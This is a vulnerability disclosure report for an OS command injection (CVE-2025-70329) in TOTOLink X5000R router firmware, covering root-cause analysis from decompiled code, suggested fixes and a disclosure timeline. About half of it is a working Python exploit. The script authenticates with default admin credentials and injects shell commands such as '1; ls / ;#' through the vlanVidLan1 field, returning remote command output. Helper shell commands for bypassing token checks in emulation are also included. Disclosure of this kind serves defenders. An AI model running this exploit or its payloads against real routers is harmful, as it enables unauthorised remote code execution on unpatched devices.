# CVE-2025-70329

**Discoverer:** Neighborhood-Hacker Team

**Vulnerability Type:** OS Command Injection (CWE-78)

1.	Vulnerability Title
    
    a.  TOTOLink X5000R_Latest bug fix version v9.1.0cu_2415_B20250515 OS Command Injection

2. High-level overview of the vulnerability and the possible effect of using it

    In the `setIptvCfg` handler of the `/usr/sbin/lighttpd` executable, `vlanVidLan1` (from Uci_Get_Str) is inserted into `snprintf("ifconfig br-vlan%s down", v91)` and passed to `CsteSystem` without validation, allowing shell metacharacters (e.g. ;, #) to enable arbitrary command execution (RCE).

3.	Exact product that was found to be vulnerable including complete version information
    a. vulnerable code exists in TOTOLink X5000R_Latest

    b. We tested the vulnerability on TOTOLink X5000R_Latest bug fix version v9.1.0cu_2415_B20250515

4. Root Cause Analysis

    Since vendor does not provide source code, the following explanation is based on the firmware binary /usr/sbin/lighttpd

    a. Detailed description of the vulnerability
    
    In the function sub_415F58, the vlanVidLan value loaded via Uci_Get_Str is inserted verbatim into a shell command string (e.g. snprintf("ifconfig br-vlan%s down", v91)) without any validation or filtering, and that string is executed by the OS shell via CsteSystem

```c
      //... omitted ...
    Uci_Set_Str(10, "iptv", "wifiVlanEnabled", "0");
    Uci_Get_Str(10, "iptv", "vlanVidLan1", v91);
    Uci_Get_Str(10, "iptv", "vlanVidLan2", v92);
    Uci_Get_Str(10, "iptv", "vlanVidLan3", v93);
    Uci_Get_Str(10, "iptv", "vlanVidLan4", v94);
    Uci_Get_Int(15, "hardware", "PortNum", &v89);
    v7 = 0;
    if ( v89 >= 1 )
    {
        while ( (unsigned int)(snprintf(v102, 256, "vconfig rem ra%d.%s", v7, (const char *)v91) + 1) < 0x101 )
        {
        CsteSystem(v102, 0);
        if ( (unsigned int)(snprintf(v102, 256, "vconfig rem rax%d.%s", v7, (const char *)v91) + 1) >= 0x101 )
            break;
        CsteSystem(v102, 0);
        if ( (unsigned int)(snprintf(v102, 256, "vconfig rem ra%d.%s", v7, (const char *)v92) + 1) >= 0x101 )
            break;
        CsteSystem(v102, 0);
        if ( (unsigned int)(snprintf(v102, 256, "vconfig rem rax%d.%s", v7, (const char *)v92) + 1) >= 0x101 )
            break;
        CsteSystem(v102, 0);
        if ( (unsigned int)(snprintf(v102, 256, "vconfig rem ra%d.%s", v7, (const char *)v93) + 1) >= 0x101 )
            break;
        CsteSystem(v102, 0);
        if ( (unsigned int)(snprintf(v102, 256, "vconfig rem rax%d.%s", v7, (const char *)v93) + 1) >= 0x101 )
            break;
        CsteSystem(v102, 0);
        if ( (unsigned int)(snprintf(v102, 256, "vconfig rem ra%d.%s", v7, (const char *)v94) + 1) >= 0x101 )
            break;
        CsteSystem(v102, 0);
        if ( (unsigned int)(snprintf(v102, 256, "vconfig rem rax%d.%s", v7, (const char *)v94) + 1) >= 0x101 )
            break;
        CsteSystem(v102, 0);
        if ( ++v7 >= v89 )
            goto LABEL_18;
        }
        goto LABEL_9;
    }
    LABEL_18:
    if ( (unsigned int)(snprintf(v102, 256, "ifconfig br-vlan%s down", (const char *)v91) + 1) >= 0x101 )
        goto LABEL_9;
    CsteSystem(v102, 0);
    if ( (unsigned int)(snprintf(v102, 256, "brctl delbr br-vlan%s", (const char *)v91) + 1) >= 0x101 )
        goto LABEL_9;
    CsteSystem(v102, 0);
    if ( (unsigned int)(snprintf(v102, 256, "ifconfig br-vlan%s down", (const char *)v92) + 1) >= 0x101 )
        goto LABEL_9;
    CsteSystem(v102, 0);
    if ( (unsigned int)(snprintf(v102, 256, "brctl delbr br-vlan%s", (const char *)v92) + 1) >= 0x101 )
        goto LABEL_9;
    CsteSystem(v102, 0);
    if ( (unsigned int)(snprintf(v102, 256, "ifconfig br-vlan%s down", (const char *)v93) + 1) >= 0x101 )
        goto LABEL_9;
    CsteSystem(v102, 0);
    if ( (unsigned int)(snprintf(v102, 256, "brctl delbr br-vlan%s", (const char *)v93) + 1) >= 0x101 )
        goto LABEL_9;
    CsteSystem(v102, 0);
    if ( (unsigned int)(snprintf(v102, 256, "ifconfig br-vlan%s down", (const char *)v94) + 1) >= 0x101 )
        goto LABEL_9;
    CsteSystem(v102, 0);
    if ( (unsigned int)(snprintf(v102, 256, "brctl delbr br-vlan%s", (const char *)v94) + 1) >= 0x101 )
        goto LABEL_9;
    CsteSystem(v102, 0);
    //... omitted ...
        if ( atoi(v57) )
    {
        Uci_Set_Str(10, "iptv", "wanStrategy", v61);
        Uci_Set_Str(10, "iptv", "vlanEnabled", v64);
        Uci_Set_Str(10, "iptv", "vlanVidCpu", v58);
        Uci_Set_Str(10, "iptv", "vlanPriCpu", v67);
        Uci_Set_Str(10, "iptv", "vlanVidIptv", v68);
        Uci_Set_Str(10, "iptv", "vlanPriIptv", v69);
        Uci_Set_Str(10, "iptv", "vlanVidLan1", v59);
        Uci_Set_Str(10, "iptv", "vlanPriLan1", v70);
        Uci_Set_Str(10, "iptv", "vlanVidLan2", v62);
        Uci_Set_Str(10, "iptv", "vlanPriLan2", v71);
        Uci_Set_Str(10, "iptv", "vlanVidLan3", v63);
        Uci_Set_Str(10, "iptv", "vlanPriLan3", v72);
        Uci_Set_Str(10, "iptv", "vlanVidLan4", v66);
        Uci_Set_Str(10, "iptv", "vlanPriLan4", v73);
    }
        //... omitted ...
```

    b. suggested fixes
    Validate vlanVidLan1 with s_cmd_string_valid() and a numeric whitelist (1–4094); if validation fails, reject and log. Do not embed input in shell strings—use execl/execv or native APIs and run CGI with least privilege.

5.   Exploit
    The exploit was executed by sending the above HTTP POST request via Burp Suite’s Repeater. The crafted vlanVidLan1 payload ("1; ls / ;#") was delivered to the setIptvCfg endpoint, resulting in remote command execution; the command output was returned to the client in the HTTP response body according to the CGI behavior.


```python
import requests
import json
import hashlib
import time
import re
import sys
import ipaddress

# --- 1. Login authentication function: get_auth_session (user-provided code as is) ---

def get_auth_session(ip_address, username_hash, password_hash):
    """
    Send a login authentication request and return an authenticated session object upon successful authentication.
    """
    url = f"http://{ip_address}/cgi-bin/cstecgi.cgi"
    
    payload = {
        "username": username_hash,
        "password": password_hash,
        "flag": "0",
        "topicurl": "loginAuth",
        "token": "" 
    }

    # Request Header
    headers = {
        "Host": ip_address,
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "ko-KR,ko;q=0.9",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
        "Origin": f"http://{ip_address}",
        "Referer": f"http://{ip_address}/login.html",
        "Connection": "keep-alive"
    }

    data_string = json.dumps(payload, separators=(',', ':'))

    print(f"Start login request: {url}")
    print(f"Payload: {data_string}")

    s = requests.Session()
    s.headers.update(headers)

    try:
        response = s.post(url, data=data_string, verify=False, timeout=10)
        
        print(f"\n--- Response information (loginAuth) ---")
        print(f"Response status code: {response.status_code}")
        print(f"Response Body Raw Text:")
        print(response.text) 
        
        response_text = response.text.strip()
        
        is_success = response.status_code == 200 and (re.search(r'"loginFlag"\s*:\s*0', response_text) is not None)
        
        if is_success:
            print("\n[+] **Verify login success! Proceed to the next step")
            return s # Return Authenticated Session Object
        else:
            print("\nLogin failed. No pattern was found in the response signal indicating success.")

    except requests.exceptions.RequestException as e:
        print(f"\nRequest Error Occurred: {e}")
        
    return None # Return None on Failure

# --- 2. Configuration request processing function (add command execution result separation logic) ---

def handle_config_requests(ip_address, token_value, auth_session):
    
    url = f"http://{ip_address}/cgi-bin/cstecgi.cgi"
    
    # --------------------------------------------------------
    # 2-1. First request: getWizardCfg (verify authentication token)
    # --------------------------------------------------------
    print("\n" + "="*50)
    print("1. getWizardCfg request (check authentication token)")
    print("="*50)
    
    get_payload = {"topicurl": "getWizardCfg", "token": token_value}
    get_data = json.dumps(get_payload, separators=(',', ':'))
    
    try:
        response = auth_session.post(url, data=get_data, verify=False, timeout=10)
        
        if "errcode" not in response.text or "token invalid" not in response.text:
            print(f"Response Status Code: {response.status_code}")
            print("Response Body:", response.text)
            print("\n[+] **getWizardCfg Successful:** Authenticated tokens are valid. Try the following setup request.")
        else:
            print(f"Response Status Code: {response.status_code}")
            print("\n[-] getWizardCfg failed: token is invalid skip command insert request.")
            print("Response Body:", response.text)
            return

    except requests.exceptions.RequestException as e:
        print(f"\n[Error] getWizardCfg request failed: {e}")
        return

    # --------------------------------------------------------
    # 2-2. Second request: setIptvCfg (for instruction insertion practice)
    # --------------------------------------------------------
    print("\n" + "="*50)
    print("2. setIptvCfg request (for instruction insertion practice)")
    print("="*50)

    # You receive a command insert string directly from the user.
    print("When entering the instruction insert string, enter **without quotation marks to avoid JSON escape.")
    command_input = input("Enter a practical instruction insert string (e.g. 1; ls / ;#): ")

    # Preparing for Request Payload
    set_payload = {
      "topicurl": "setIptvCfg",
      "token": token_value,
      "iptvEnabled": "1", "iptvVer": "1", "wanStrategy": "0", "vlanEnabled": "1",
      "vlanVidCpu": "2", "vlanPriCpu": "5", "vlanVidIptv": "3", "vlanPriIptv": "5",
      "vlanVidLan1": command_input,
      "vlanPriLan1": "5", "vlanVidLan2": "1", "vlanPriLan2": "5",
      "vlanVidLan3": "1", "vlanPriLan3": "5", "vlanVidLan4": "1",
      "vlanPriLan4": "5", "wifiVlanEnabled": "0", "mrEnable": "1",
      "mrQleave": "3", "etherIgmp": "1", "udpxyEnable": "0", "udpxyProt": "8888"
    }
    
    set_data = json.dumps(set_payload, separators=(',', ':'))
    
    print(f"Payload: {set_data}")
    
    # --- Send Request #2 Start ---
    for i in range(1, 3):
        print(f"\n---> Sending setIptvCfg Request #{i}...")
        try:
            response = auth_session.post(url, data=set_data, verify=False, timeout=10) 
            
            json_start = response.text.find('{')
            
            if json_start != -1:
                cmd_output = response.text[:json_start].strip()
                json_response = response.text[json_start:].strip()
                
                print(f"Response Status Code: {response.status_code}")
                print("\n==============================================")
                print(f"[+] Command Execution Results (Raw Output) #{i}")
                print("==============================================")
                print(cmd_output)
                print("\n==============================================")
                print(f"[+] Server's final JSON response #{i}")
                print("==============================================")
                print(json_response)
            else:
                print(f"Response Status Code: {response.status_code}")
                print(f"Response Body (JSON not found) #{i}:")
                print(response.text)

        except requests.exceptions.ReadTimeout:
            print(f"\n**[-] Read Timeout Occurred! (Request #{i})** Server execution time exceeded limit.")
            print("💡 The command may have executed successfully. Check the VM.")
            
        except requests.exceptions.RequestException as e:
            print(f"\n[Error] Setting request error occurred (Request #{i}): {e}")
    # ---  Request #2 is over  ---


# --- 3. Practice ---

def validate_ip(ip_address):
    """IP address format validation"""
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False

if __name__ == "__main__":
    
    # 3.0. Getting an IP address from a user
    while True:
        IP_ADDR = input("Enter the destination IP address to access (e.g. 192.168.0.12): ").strip()
        if validate_ip(IP_ADDR):
            break
        else:
            print("[Error] This is not a valid IP address format. Please re-enter.")
            
    USER_HASH = "21232f297a57a5a743894a0e4a801fc3" 
    PASS_HASH = "21232f297a57a5a743894a0e4a801fc3" 
    
    print(f"\nDestination IP address: {IP_ADDR}")

    # 3.1. Attempt to obtain an authenticated session object
    auth_session = get_auth_session(IP_ADDR, USER_HASH, PASS_HASH)
    
    # 3.2. If the authentication is successful, the next time you request it
    if auth_session:
        print("\n\n--- Step 1: Enter authentication token values ---")
        input_token = input("Please enter a new token (value to try): ")
        
        handle_config_requests(IP_ADDR, input_token, auth_session)
    else:
        print("\nThe final authentication was not successful. The following requests could not be processed.")
```

Token values for login authentication must be manually entered after the token is issued through token invalid code.
It also proceeded with both id and password set to admin.

\# token invalid solution code

sudo chroot . /bin/sh -c 't=$(date +%s); echo -n "$t" | md5sum | awk "{print \$1}" | tr -d "\n" > /tmp/cookie_key; echo -n "$t" > /tmp/token_uptime; ls -l /tmp/cookie_key /tmp/token_uptime;'

\# host invalid solution code

sudo chroot . /bin/sh -c 'mkdir -p /var/cste; echo "remote_ipaddr=192.168.0.5" > /var/cste/temp_status'

# 6. Disclosure Timeline
    - 2025-10-22: Vulnerability reported to vendor (TOTOLINK).
    - 2025-12-21: No response from vendor after 60 days.
    - 2025-12-22: Vulnerability reported to MITRE (CVE Assignment Team).
    - 2026-02-11: CVE ID assigned (RESERVED state).
    - 2026-02-23: Public disclosure (0-day) and notification to MITRE for publication.
